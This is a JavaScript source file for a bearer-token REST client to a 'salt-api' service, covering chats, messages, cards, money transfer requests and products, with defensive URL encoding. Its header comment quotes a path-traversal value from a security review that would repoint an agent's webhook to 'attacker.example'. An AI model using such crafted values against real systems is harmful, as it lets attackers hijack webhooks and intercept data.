// A minimal REST client for salt-api, scoped to the hosted MCP server's
// KEYLESS toolset (src/keyless-tools.mjs). Distinct from
// salt-agent-sdk's createSaltClient because that client authenticates with
// an `api-key` header bound to one long-lived local identity; this one
// authenticates every call with a per-request OAuth bearer token (an
// opaque `sat_...` access token minted by salt-api, per the K5 contract in
// design-fleet/runs/2026-09-17-distribution/LANES.md) and is built fresh
// per incoming MCP request -- see src/http.mjs's callerFromBearer.
//
// AUTH IS PASS-THROUGH, NEVER STORED: the bearer token lives only in the
// arguments of these functions and the Authorization header of the
// outbound fetch. Nothing here logs it, persists it, or returns it.
//
// SECURITY: every value interpolated into a URL PATH (never the query
// string, which URLSearchParams already percent-encodes) goes through
// encodeURIComponent, full stop -- no exceptions, no "this one's already
// validated upstream so it's fine." A 2026-09-18 security review found
// `updateCard`'s un-encoded `cardId` let a crafted `card_id` like
// `../agents/callback?webhook=https://attacker.example/hook` turn a PATCH
// to `/api/v1/cards/:id` into a PATCH to `/api/v1/agents/callback` instead
// -- a path-traversal that could have pointed a REAL agent's webhook at an
// attacker's server. encodeURIComponent alone closes that (it escapes `/`
// and `?`), and src/keyless-tools.mjs's assertPlainId adds a second,
// independent layer (refusing anything that isn't a bare UUID/integer
// BEFORE it ever reaches here) -- belt and suspenders, not either/or.

/**
 * Mirrors salt-agent-sdk's SaltApiError shape (status + body + one-sentence
 * message). `retryAfterSeconds` (2026-09-19 availability review, N2) carries
 * a 429 response's `Retry-After` header when present, so a caller -- right
 * now, keyless-tools.mjs's pollForCardInteraction -- can back off for
 * exactly as long as asked instead of retrying immediately or treating a
 * rate limit as a fatal error.
 */
export class SaltBearerApiError extends Error {
  constructor(method, path, status, body, retryAfterSeconds) {
    const reason = body && typeof body === "object" && typeof body.error === "string" ? `: ${body.error}` : "";
    super(`Salt API ${method} ${path} -> ${status}${reason}`);
    this.name = "SaltBearerApiError";
    this.status = status;
    this.body = body;
    this.retryAfterSeconds = retryAfterSeconds;
  }
}

/**
 * @param {{host: string, fetchImpl?: typeof fetch}} options
 */
export function createSaltBearerClient({ host, fetchImpl }) {
  const base = host.replace(/\/$/, "");
  const doFetch = fetchImpl ?? fetch;

  async function request(method, path, bearerToken, body, { signal } = {}) {
    const url = `${base}${path}`;
    const headers = { Authorization: `Bearer ${bearerToken}` };
    if (body !== undefined) headers["Content-Type"] = "application/json";
    const res = await doFetch(url, {
      method,
      headers,
      body: body !== undefined ? JSON.stringify(body) : undefined,
      signal,
    });
    let parsed;
    const text = await res.text().catch(() => "");
    if (text) {
      try {
        parsed = JSON.parse(text);
      } catch {
        parsed = text;
      }
    }
    if (!res.ok) {
      const retryAfterHeader = res.headers?.get?.("Retry-After") ?? res.headers?.get?.("retry-after");
      const retryAfterSeconds = retryAfterHeader != null ? Number(retryAfterHeader) : undefined;
      throw new SaltBearerApiError(method, path, res.status, parsed, Number.isFinite(retryAfterSeconds) ? retryAfterSeconds : undefined);
    }
    return parsed;
  }

  return {
    /**
     * Generic escape hatch for a caller (src/room-tools.mjs's open-room
     * tools) that needs a REST verb/path this client doesn't already wrap
     * with its own named method -- same auth, same error handling
     * (SaltBearerApiError) as every method below, just without a bespoke
     * wrapper per endpoint. Kept last-resort on purpose: prefer a named
     * method (postMessage, getChat, ...) wherever one already exists, so a
     * path/verb typo is still caught by something more specific than "any
     * string".
     */
    async rawRequest(bearerToken, method, path, body) {
      return request(method, path, bearerToken, body);
    },

    /** Non-contact directory search, and the agent directory -- find_people_and_agents. */
    async searchContacts(bearerToken, query) {
      const results = await request("GET", `/api/v1/search/contacts?q=${encodeURIComponent(query)}`, bearerToken);
      return Array.isArray(results) ? results : results?.results || [];
    },

    async listAgentsDirectory(bearerToken) {
      const agents = await request("GET", "/api/v1/agents", bearerToken);
      return Array.isArray(agents) ? agents : [];
    },

    /** Get-or-create a 1:1 chat with `contactId`. */
    async createOrGetChat(bearerToken, contactId) {
      return request("POST", "/api/v1/chats", bearerToken, { contact_id: contactId });
    },

    /** Chat list, metadata only (see keyless-tools.mjs's list_chats, which strips further). */
    async listChats(bearerToken) {
      const chats = await request("GET", "/api/v1/chats", bearerToken);
      return Array.isArray(chats) ? chats : [];
    },

    /** A single chat's members (with public keys) and session metadata. */
    async getChat(bearerToken, chatId) {
      return request("GET", `/api/v1/chats/${encodeURIComponent(chatId)}`, bearerToken);
    },

    /** Post a ciphertext message. No senderMessage -- a keyless agent has no private key to read one back with. */
    async postMessage(bearerToken, chatId, message) {
      return request("POST", "/api/v1/messages", bearerToken, { chat_id: chatId, message });
    },

    async postCard(bearerToken, chatId, blocks, text) {
      return request("POST", "/api/v1/cards", bearerToken, { chat_id: chatId, blocks, text });
    },

    async updateCard(bearerToken, cardId, blocks) {
      return request("PATCH", `/api/v1/cards/${encodeURIComponent(cardId)}`, bearerToken, { blocks });
    },

    /**
     * Short-poll the socket-mode outbox (K2 contract). `timeoutSeconds` is
     * clamped server-side to 0..2 regardless of what's asked here. `signal`
     * (an AbortSignal) lets a caller stop an in-flight poll -- see
     * keyless-tools.mjs's pollForCardInteraction, wired in src/http.mjs to
     * the MCP request's own `res.on("close")`.
     */
    async agentUpdates(bearerToken, { after = 0, timeoutSeconds = 2, limit = 50, signal } = {}) {
      const qs = new URLSearchParams({ after: String(after), timeout: String(timeoutSeconds), limit: String(limit) });
      return request("GET", `/api/v1/agent/updates?${qs}`, bearerToken, undefined, { signal });
    },

    /**
     * This connection's own OAuth grant: the scopes the human approved and
     * the wallet(s) they explicitly attached to it, per chain/testnet
     * (`{scopes: string[], wallets: [{id, chain, testnet, label}]}`).
     * THIS is also how src/http.mjs validates a bearer token is real --
     * see createTokenValidator -- so it doubles as this connection's one
     * source of truth for which wallet a money tool may use. A keyless
     * agent owns no wallet of its own (see the header comment on
     * pickGrantedWallet in keyless-tools.mjs for why that's permanent, not
     * a gap to fill in later).
     */
    async getGrant(bearerToken, opts) {
      return request("GET", "/api/v1/oauth2/grant", bearerToken, undefined, opts);
    },

    /** A plain (non-itemized) money request, or an itemized invoice when `requestType`/`lineItems` are given. */
    async createTransferRequest(bearerToken, { chatId, receiverId, walletId, amount, message, requestType, lineItems, dueAt }) {
      const body = { chat_id: chatId, receiver_id: receiverId, wallet_id: walletId, amount, message };
      if (requestType) body.request_type = requestType;
      if (lineItems) body.line_items = lineItems;
      if (dueAt) body.due_at = dueAt;
      return request("POST", "/api/v1/transfer_requests", bearerToken, body);
    },

    /**
     * TransferRequestsController has no `show` action (routes.rb defines
     * the route, but the controller never implements it -- confirmed
     * against the real controller source, 2026-09-18), so `#index`
     * (scoped server-side to requests where the caller is sender OR
     * receiver) is the only real way to read one request's current
     * status. get_payment_status filters this list by id.
     */
    async listTransferRequests(bearerToken) {
      const requests = await request("GET", "/api/v1/transfer_requests", bearerToken);
      return Array.isArray(requests) ? requests : [];
    },

    async listProducts(bearerToken, sellerId) {
      const path = sellerId ? `/api/v1/products?seller_id=${encodeURIComponent(sellerId)}` : "/api/v1/products";
      const products = await request("GET", path, bearerToken);
      return Array.isArray(products) ? products : [];
    },

    async createProduct(bearerToken, params) {
      return request("POST", "/api/v1/products", bearerToken, params);
    },
  };
}
